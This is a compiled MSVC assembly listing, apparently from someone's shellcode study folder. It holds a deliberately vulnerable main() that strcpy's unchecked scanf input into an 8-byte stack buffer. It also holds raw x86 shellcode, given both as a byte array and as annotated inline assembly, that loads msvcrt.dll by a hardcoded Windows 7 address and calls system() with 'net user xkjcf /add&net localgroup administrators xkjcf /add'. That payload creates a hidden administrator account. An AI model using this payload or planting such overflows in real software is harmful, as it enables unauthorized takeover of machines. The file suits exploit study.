	TITLE	K:\安全学习\小强之shellcode\C代码\AddUser\Add\Add.cpp
	.386P
include listing.inc
if @Version gt 510
.model FLAT
else
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
_BSS	ENDS
_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
_TLS	ENDS
;	COMDAT ??_C@_0BA@ELDE@please?5input?4?4?6?$AA@
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
;	COMDAT ??_C@_02DILL@?$CFs?$AA@
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
;	COMDAT ??_C@_09LCDD@input?$DN?$CFs?6?$AA@
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
;	COMDAT ??8@YAHABU_GUID@@0@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT _main
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?_main@@YAHXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
FLAT	GROUP _DATA, CONST, _BSS
	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
endif
PUBLIC	?AddUser@@3PADA					; AddUser
PUBLIC	?buffer@@3PADA					; buffer
_BSS	SEGMENT
?buffer@@3PADA DB 02800H DUP (?)			; buffer
_BSS	ENDS
_DATA	SEGMENT
?AddUser@@3PADA DB 'U', 08bH, 0ecH, 'R', 083H, 0ecH, '@', 0c6H, 'E', 0c1H
	DB	'm', 0c6H, 'E', 0c2H, 's', 0c6H, 'E', 0c3H, 'v', 0c6H, 'E', 0c4H
	DB	'c', 0c6H, 'E', 0c5H, 'r', 0c6H, 'E', 0c6H, 't', 0c6H, 'E', 0c7H
	DB	'.', 0c6H, 'E', 0c8H, 'd', 0c6H, 'E', 0c9H, 'l', 0c6H, 'E', 0caH
	DB	'l', 0c6H, 'E', 0cbH, 00H, '3', 0d2H, 08dH, 'U', 0c1H, 'R', 0baH
	DB	04H, '((u', 0ffH, 0d2H, 0c6H, 'E', 0c1H, 'n', 0c6H, 'E', 0c2H, 'e'
	DB	0c6H, 'E', 0c3H, 't', 0c6H, 'E', 0c4H, ' ', 0c6H, 'E', 0c5H, 'u'
	DB	0c6H, 'E', 0c6H, 's', 0c6H, 'E', 0c7H, 'e', 0c6H, 'E', 0c8H, 'r'
	DB	0c6H, 'E', 0c9H, ' ', 0c6H, 'E', 0caH, 'x', 0c6H, 'E', 0cbH, 'k'
	DB	0c6H, 'E', 0ccH, 'j', 0c6H, 'E', 0cdH, 'c', 0c6H, 'E', 0ceH, 'f'
	DB	0c6H, 'E', 0cfH, ' ', 0c6H, 'E', 0d0H, '/', 0c6H, 'E', 0d1H, 'a'
	DB	0c6H, 'E', 0d2H, 'd', 0c6H, 'E', 0d3H, 'd', 0c6H, 'E', 0d4H, '&'
	DB	0c6H, 'E', 0d5H, 'n', 0c6H, 'E', 0d6H, 'e', 0c6H, 'E', 0d7H, 't'
	DB	0c6H, 'E', 0d8H, ' ', 0c6H, 'E', 0d9H, 'l', 0c6H, 'E', 0daH, 'o'
	DB	0c6H, 'E', 0dbH, 'c', 0c6H, 'E', 0dcH, 'a', 0c6H, 'E', 0ddH, 'l'
	DB	0c6H, 'E', 0deH, 'g', 0c6H, 'E', 0dfH, 'r', 0c6H, 'E', 0e0H, 'o'
	DB	0c6H, 'E', 0e1H, 'u', 0c6H, 'E', 0e2H, 'p', 0c6H, 'E', 0e3H, ' '
	DB	0c6H, 'E', 0e4H, 'a', 0c6H, 'E', 0e5H, 'd', 0c6H, 'E', 0e6H, 'm'
	DB	0c6H, 'E', 0e7H, 'i', 0c6H, 'E', 0e8H, 'n', 0c6H, 'E', 0e9H, 'i'
	DB	0c6H, 'E', 0eaH, 's', 0c6H, 'E', 0ebH, 't', 0c6H, 'E', 0ecH, 'r'
	DB	0c6H, 'E', 0edH, 'a', 0c6H, 'E', 0eeH, 't', 0c6H, 'E', 0efH, 'o'
	DB	0c6H, 'E', 0f0H, 'r', 0c6H, 'E', 0f1H, 's', 0c6H, 'E', 0f2H, ' '
	DB	0c6H, 'E', 0f3H, 'x', 0c6H, 'E', 0f4H, 'k', 0c6H, 'E', 0f5H, 'j'
	DB	0c6H, 'E', 0f6H, 'c', 0c6H, 'E', 0f7H, 'f', 0c6H, 'E', 0f8H, ' '
	DB	0c6H, 'E', 0f9H, '/', 0c6H, 'E', 0faH, 'a', 0c6H, 'E', 0fbH, 'd'
	DB	0c6H, 'E', 0fcH, 'd', 0c6H, 'E', 0fdH, 00H, '3', 0d2H, 08dH, 'U'
	DB	0c1H, 'R', 0baH, 'w', 0b1H, 0d4H, 'u', 0ffH, 0d2H, 'Z', 08bH, 0e5H
	DB	']', 0c3H, 00H				; AddUser
_DATA	ENDS
PUBLIC	_main
PUBLIC	??_C@_0BA@ELDE@please?5input?4?4?6?$AA@		; `string'
PUBLIC	??_C@_02DILL@?$CFs?$AA@				; `string'
PUBLIC	??_C@_09LCDD@input?$DN?$CFs?6?$AA@		; `string'
EXTRN	_printf:NEAR
EXTRN	_scanf:NEAR
;	COMDAT ??_C@_0BA@ELDE@please?5input?4?4?6?$AA@
; File K:\安全学习\小强之shellcode\C代码\AddUser\Add\Add.cpp
_DATA	SEGMENT
??_C@_0BA@ELDE@please?5input?4?4?6?$AA@ DB 'please input..', 0aH, 00H ; `string'
_DATA	ENDS
;	COMDAT ??_C@_02DILL@?$CFs?$AA@
_DATA	SEGMENT
??_C@_02DILL@?$CFs?$AA@ DB '%s', 00H			; `string'
_DATA	ENDS
;	COMDAT ??_C@_09LCDD@input?$DN?$CFs?6?$AA@
_DATA	SEGMENT
??_C@_09LCDD@input?$DN?$CFs?6?$AA@ DB 'input=%s', 0aH, 00H ; `string'
_DATA	ENDS
;	COMDAT _main
_TEXT	SEGMENT
_input$ = -8
_main	PROC NEAR					; COMDAT

; 32   : {

  00000	83 ec 08	 sub	 esp, 8
  00003	56		 push	 esi
  00004	57		 push	 edi

; 33   : /*	__asm{
; 34   :         lea eax,AddUser
; 35   :         push eax
; 36   :         ret
; 37   : 	}
; 38   : */
; 39   : char  input[8];
; 40   : printf("please input..\n");

  00005	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_0BA@ELDE@please?5input?4?4?6?$AA@ ; `string'
  0000a	e8 00 00 00 00	 call	 _printf

; 41   : scanf("%s",buffer);

  0000f	68 00 00 00 00	 push	 OFFSET FLAT:?buffer@@3PADA ; buffer
  00014	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_02DILL@?$CFs?$AA@ ; `string'
  00019	e8 00 00 00 00	 call	 _scanf

; 42   : strcpy(input,buffer);

  0001e	bf 00 00 00 00	 mov	 edi, OFFSET FLAT:?buffer@@3PADA ; buffer
  00023	83 c9 ff	 or	 ecx, -1
  00026	33 c0		 xor	 eax, eax
  00028	8d 54 24 14	 lea	 edx, DWORD PTR _input$[esp+28]
  0002c	f2 ae		 repne scasb
  0002e	f7 d1		 not	 ecx
  00030	2b f9		 sub	 edi, ecx
  00032	8b c1		 mov	 eax, ecx
  00034	8b f7		 mov	 esi, edi
  00036	8b fa		 mov	 edi, edx
  00038	c1 e9 02	 shr	 ecx, 2
  0003b	f3 a5		 rep movsd
  0003d	8b c8		 mov	 ecx, eax
  0003f	83 e1 03	 and	 ecx, 3
  00042	f3 a4		 rep movsb

; 43   : printf("input=%s\n",input);

  00044	8d 4c 24 14	 lea	 ecx, DWORD PTR _input$[esp+28]
  00048	51		 push	 ecx
  00049	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_09LCDD@input?$DN?$CFs?6?$AA@ ; `string'
  0004e	e8 00 00 00 00	 call	 _printf
  00053	83 c4 14	 add	 esp, 20			; 00000014H

; 44   : return 0;

  00056	33 c0		 xor	 eax, eax
  00058	5f		 pop	 edi
  00059	5e		 pop	 esi

; 45   : }

  0005a	83 c4 08	 add	 esp, 8
  0005d	c3		 ret	 0
_main	ENDP
_TEXT	ENDS
PUBLIC	?_main@@YAHXZ					; _main
;	COMDAT ?_main@@YAHXZ
_TEXT	SEGMENT
?_main@@YAHXZ PROC NEAR					; _main, COMDAT

; 57   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 58   : 
; 59   : 	 //LoadLibrary在win7下的地址为0x761a2804
; 60   : 	 __asm{
; 61   : 		  //保存现场
; 62   : 		  push ebp

  00003	55		 push	 ebp

; 63   : 		  mov  ebp, esp

  00004	8b ec		 mov	 ebp, esp

; 64   : 		  push edx

  00006	52		 push	 edx

; 65   : 		  sub  esp, 40h

  00007	83 ec 40	 sub	 esp, 64			; 00000040H

; 66   : 		  /*
; 67   : 		  *msvcrt.dll
; 68   : 		  */
; 69   : 		  mov  byte ptr [ebp-3fh],6dh //m

  0000a	c6 45 c1 6d	 mov	 BYTE PTR [ebp-63], 109	; 0000006dH

; 70   : 		  mov  byte ptr [ebp-3eh],73h //s

  0000e	c6 45 c2 73	 mov	 BYTE PTR [ebp-62], 115	; 00000073H

; 71   : 		  mov  byte ptr [ebp-3dh],76h //v

  00012	c6 45 c3 76	 mov	 BYTE PTR [ebp-61], 118	; 00000076H

; 72   : 		  mov  byte ptr [ebp-3ch],63h //c

  00016	c6 45 c4 63	 mov	 BYTE PTR [ebp-60], 99	; 00000063H

; 73   : 		  mov  byte ptr [ebp-3bh],72h //r

  0001a	c6 45 c5 72	 mov	 BYTE PTR [ebp-59], 114	; 00000072H

; 74   : 		  mov  byte ptr [ebp-3ah],74h //t

  0001e	c6 45 c6 74	 mov	 BYTE PTR [ebp-58], 116	; 00000074H

; 75   : 		  mov  byte ptr [ebp-39h],2eh //.

  00022	c6 45 c7 2e	 mov	 BYTE PTR [ebp-57], 46	; 0000002eH

; 76   : 		  mov  byte ptr [ebp-38h],64h //d

  00026	c6 45 c8 64	 mov	 BYTE PTR [ebp-56], 100	; 00000064H

; 77   : 		  mov  byte ptr [ebp-37h],6ch //l

  0002a	c6 45 c9 6c	 mov	 BYTE PTR [ebp-55], 108	; 0000006cH

; 78   : 		  mov  byte ptr [ebp-36h],6ch //l

  0002e	c6 45 ca 6c	 mov	 BYTE PTR [ebp-54], 108	; 0000006cH

; 79   : 		  mov  byte ptr [ebp-35h],0h //0

  00032	c6 45 cb 00	 mov	 BYTE PTR [ebp-53], 0

; 80   : 		  //调用LoadLibrary加载msvcrt.dll
; 81   : 		  lea  edx, [ebp-3fh]

  00036	8d 55 c1	 lea	 edx, DWORD PTR [ebp-63]

; 82   : 		  push edx

  00039	52		 push	 edx

; 83   : 		  mov  edx, 761a2804h

  0003a	ba 04 28 1a 76	 mov	 edx, 1981425668		; 761a2804H

; 84   : 		  call edx

  0003f	ff d2		 call	 edx

; 85   : 		  /*
; 86   : 		  * net user xkjcf /add&net localgroup administrators xkjcf /add 共60字节
; 87   : 		  */
; 88   : 		  mov  byte ptr [ebp-3fh],6eh //n

  00041	c6 45 c1 6e	 mov	 BYTE PTR [ebp-63], 110	; 0000006eH

; 89   : 		  mov  byte ptr [ebp-3eh],65h //e

  00045	c6 45 c2 65	 mov	 BYTE PTR [ebp-62], 101	; 00000065H

; 90   : 		  mov  byte ptr [ebp-3dh],74h //t

  00049	c6 45 c3 74	 mov	 BYTE PTR [ebp-61], 116	; 00000074H

; 91   : 		  mov  byte ptr [ebp-3ch],20h //

  0004d	c6 45 c4 20	 mov	 BYTE PTR [ebp-60], 32	; 00000020H

; 92   : 		  mov  byte ptr [ebp-3bh],75h //u

  00051	c6 45 c5 75	 mov	 BYTE PTR [ebp-59], 117	; 00000075H

; 93   : 		  mov  byte ptr [ebp-3ah],73h //s

  00055	c6 45 c6 73	 mov	 BYTE PTR [ebp-58], 115	; 00000073H

; 94   : 		  mov  byte ptr [ebp-39h],65h //e

  00059	c6 45 c7 65	 mov	 BYTE PTR [ebp-57], 101	; 00000065H

; 95   : 		  mov  byte ptr [ebp-38h],72h //r

  0005d	c6 45 c8 72	 mov	 BYTE PTR [ebp-56], 114	; 00000072H

; 96   : 		  mov  byte ptr [ebp-37h],20h //

  00061	c6 45 c9 20	 mov	 BYTE PTR [ebp-55], 32	; 00000020H

; 97   : 		  mov  byte ptr [ebp-36h],78h //x

  00065	c6 45 ca 78	 mov	 BYTE PTR [ebp-54], 120	; 00000078H

; 98   : 		  mov  byte ptr [ebp-35h],6bh //k

  00069	c6 45 cb 6b	 mov	 BYTE PTR [ebp-53], 107	; 0000006bH

; 99   : 		  mov  byte ptr [ebp-34h],6ah //j

  0006d	c6 45 cc 6a	 mov	 BYTE PTR [ebp-52], 106	; 0000006aH

; 100  : 		  mov  byte ptr [ebp-33h],63h //c

  00071	c6 45 cd 63	 mov	 BYTE PTR [ebp-51], 99	; 00000063H

; 101  : 		  mov  byte ptr [ebp-32h],66h //f

  00075	c6 45 ce 66	 mov	 BYTE PTR [ebp-50], 102	; 00000066H

; 102  : 		  mov  byte ptr [ebp-31h],20h // 

  00079	c6 45 cf 20	 mov	 BYTE PTR [ebp-49], 32	; 00000020H

; 103  : 		  mov  byte ptr [ebp-30h],2fh ///

  0007d	c6 45 d0 2f	 mov	 BYTE PTR [ebp-48], 47	; 0000002fH

; 104  : 		  mov  byte ptr [ebp-2fh],61h //a

  00081	c6 45 d1 61	 mov	 BYTE PTR [ebp-47], 97	; 00000061H

; 105  : 		  mov  byte ptr [ebp-2eh],64h //d

  00085	c6 45 d2 64	 mov	 BYTE PTR [ebp-46], 100	; 00000064H

; 106  : 		  mov  byte ptr [ebp-2dh],64h //d

  00089	c6 45 d3 64	 mov	 BYTE PTR [ebp-45], 100	; 00000064H

; 107  : 		  mov  byte ptr [ebp-2ch],26h //&

  0008d	c6 45 d4 26	 mov	 BYTE PTR [ebp-44], 38	; 00000026H

; 108  : 		  mov  byte ptr [ebp-2bh],6eh //n

  00091	c6 45 d5 6e	 mov	 BYTE PTR [ebp-43], 110	; 0000006eH

; 109  : 		  mov  byte ptr [ebp-2ah],65h //e

  00095	c6 45 d6 65	 mov	 BYTE PTR [ebp-42], 101	; 00000065H

; 110  : 		  mov  byte ptr [ebp-29h],74h //t

  00099	c6 45 d7 74	 mov	 BYTE PTR [ebp-41], 116	; 00000074H

; 111  : 		  mov  byte ptr [ebp-28h],20h // 

  0009d	c6 45 d8 20	 mov	 BYTE PTR [ebp-40], 32	; 00000020H

; 112  : 		  mov  byte ptr [ebp-27h],6ch //l

  000a1	c6 45 d9 6c	 mov	 BYTE PTR [ebp-39], 108	; 0000006cH

; 113  : 		  mov  byte ptr [ebp-26h],6fh //o

  000a5	c6 45 da 6f	 mov	 BYTE PTR [ebp-38], 111	; 0000006fH

; 114  : 		  mov  byte ptr [ebp-25h],63h //c

  000a9	c6 45 db 63	 mov	 BYTE PTR [ebp-37], 99	; 00000063H

; 115  : 		  mov  byte ptr [ebp-24h],61h //a

  000ad	c6 45 dc 61	 mov	 BYTE PTR [ebp-36], 97	; 00000061H

; 116  : 		  mov  byte ptr [ebp-23h],6ch //l

  000b1	c6 45 dd 6c	 mov	 BYTE PTR [ebp-35], 108	; 0000006cH

; 117  : 		  mov  byte ptr [ebp-22h],67h //g

  000b5	c6 45 de 67	 mov	 BYTE PTR [ebp-34], 103	; 00000067H

; 118  : 		  mov  byte ptr [ebp-21h],72h //r

  000b9	c6 45 df 72	 mov	 BYTE PTR [ebp-33], 114	; 00000072H

; 119  : 		  mov  byte ptr [ebp-20h],6fh //o

  000bd	c6 45 e0 6f	 mov	 BYTE PTR [ebp-32], 111	; 0000006fH

; 120  : 		  mov  byte ptr [ebp-1fh],75h //u

  000c1	c6 45 e1 75	 mov	 BYTE PTR [ebp-31], 117	; 00000075H

; 121  : 		  mov  byte ptr [ebp-1eh],70h //p

  000c5	c6 45 e2 70	 mov	 BYTE PTR [ebp-30], 112	; 00000070H

; 122  : 		  mov  byte ptr [ebp-1dh],20h // 

  000c9	c6 45 e3 20	 mov	 BYTE PTR [ebp-29], 32	; 00000020H

; 123  : 		  mov  byte ptr [ebp-1ch],61h //a

  000cd	c6 45 e4 61	 mov	 BYTE PTR [ebp-28], 97	; 00000061H

; 124  : 		  mov  byte ptr [ebp-1bh],64h //d 

  000d1	c6 45 e5 64	 mov	 BYTE PTR [ebp-27], 100	; 00000064H

; 125  : 		  mov  byte ptr [ebp-1ah],6dh //m 

  000d5	c6 45 e6 6d	 mov	 BYTE PTR [ebp-26], 109	; 0000006dH

; 126  : 		  mov  byte ptr [ebp-19h],69h //i 

  000d9	c6 45 e7 69	 mov	 BYTE PTR [ebp-25], 105	; 00000069H

; 127  : 		  mov  byte ptr [ebp-18h],6eh //n 

  000dd	c6 45 e8 6e	 mov	 BYTE PTR [ebp-24], 110	; 0000006eH

; 128  : 		  mov  byte ptr [ebp-17h],69h //i 

  000e1	c6 45 e9 69	 mov	 BYTE PTR [ebp-23], 105	; 00000069H

; 129  : 		  mov  byte ptr [ebp-16h],73h //s 

  000e5	c6 45 ea 73	 mov	 BYTE PTR [ebp-22], 115	; 00000073H

; 130  : 		  mov  byte ptr [ebp-15h],74h //t 

  000e9	c6 45 eb 74	 mov	 BYTE PTR [ebp-21], 116	; 00000074H

; 131  : 		  mov  byte ptr [ebp-14h],72h //r 

  000ed	c6 45 ec 72	 mov	 BYTE PTR [ebp-20], 114	; 00000072H

; 132  : 		  mov  byte ptr [ebp-13h],61h //a 

  000f1	c6 45 ed 61	 mov	 BYTE PTR [ebp-19], 97	; 00000061H

; 133  : 		  mov  byte ptr [ebp-12h],74h //t 

  000f5	c6 45 ee 74	 mov	 BYTE PTR [ebp-18], 116	; 00000074H

; 134  : 		  mov  byte ptr [ebp-11h],6fh //o 

  000f9	c6 45 ef 6f	 mov	 BYTE PTR [ebp-17], 111	; 0000006fH

; 135  : 		  mov  byte ptr [ebp-10h],72h //r 

  000fd	c6 45 f0 72	 mov	 BYTE PTR [ebp-16], 114	; 00000072H

; 136  : 		  mov  byte ptr [ebp-0fh],73h //s 

  00101	c6 45 f1 73	 mov	 BYTE PTR [ebp-15], 115	; 00000073H

; 137  : 		  mov  byte ptr [ebp-0eh],20h //  

  00105	c6 45 f2 20	 mov	 BYTE PTR [ebp-14], 32	; 00000020H

; 138  : 		  mov  byte ptr [ebp-0dh],78h //x 

  00109	c6 45 f3 78	 mov	 BYTE PTR [ebp-13], 120	; 00000078H

; 139  : 		  mov  byte ptr [ebp-0ch],6bh //k 

  0010d	c6 45 f4 6b	 mov	 BYTE PTR [ebp-12], 107	; 0000006bH

; 140  : 		  mov  byte ptr [ebp-0bh],6ah //j 

  00111	c6 45 f5 6a	 mov	 BYTE PTR [ebp-11], 106	; 0000006aH

; 141  : 		  mov  byte ptr [ebp-0ah],63h //c 

  00115	c6 45 f6 63	 mov	 BYTE PTR [ebp-10], 99	; 00000063H

; 142  : 		  mov  byte ptr [ebp-09h],66h //f 

  00119	c6 45 f7 66	 mov	 BYTE PTR [ebp-9], 102	; 00000066H

; 143  : 		  mov  byte ptr [ebp-08h],20h //  

  0011d	c6 45 f8 20	 mov	 BYTE PTR [ebp-8], 32	; 00000020H

; 144  : 		  mov  byte ptr [ebp-07h],2fh /// 

  00121	c6 45 f9 2f	 mov	 BYTE PTR [ebp-7], 47	; 0000002fH

; 145  : 		  mov  byte ptr [ebp-06h],61h //a 

  00125	c6 45 fa 61	 mov	 BYTE PTR [ebp-6], 97	; 00000061H

; 146  : 		  mov  byte ptr [ebp-05h],64h //d 

  00129	c6 45 fb 64	 mov	 BYTE PTR [ebp-5], 100	; 00000064H

; 147  : 		  mov  byte ptr [ebp-04h],64h //d 

  0012d	c6 45 fc 64	 mov	 BYTE PTR [ebp-4], 100	; 00000064H

; 148  : 		  mov  byte ptr [ebp-03h],0h //0 

  00131	c6 45 fd 00	 mov	 BYTE PTR [ebp-3], 0

; 149  : 		  //调用system添加管理员用户xkjcf
; 150  : 		  lea  edx, [ebp-3fh]

  00135	8d 55 c1	 lea	 edx, DWORD PTR [ebp-63]

; 151  : 		  push edx

  00138	52		 push	 edx

; 152  : 		  mov  edx, 776bb177h   //win7下的system地址

  00139	ba 77 b1 6b 77	 mov	 edx, 2003546487		; 776bb177H

; 153  : 		  call edx

  0013e	ff d2		 call	 edx

; 154  : 		  //还回现场
; 155  : 		  pop  edx

  00140	5a		 pop	 edx

; 156  : 		  mov  esp, ebp

  00141	8b e5		 mov	 esp, ebp

; 157  : 		  pop  ebp

  00143	5d		 pop	 ebp

; 158  : 		  //ret
; 159  : 	 }
; 160  : 
; 161  : 	return 0;

  00144	33 c0		 xor	 eax, eax

; 162  : }

  00146	5d		 pop	 ebp
  00147	c3		 ret	 0
?_main@@YAHXZ ENDP					; _main
_TEXT	ENDS
END
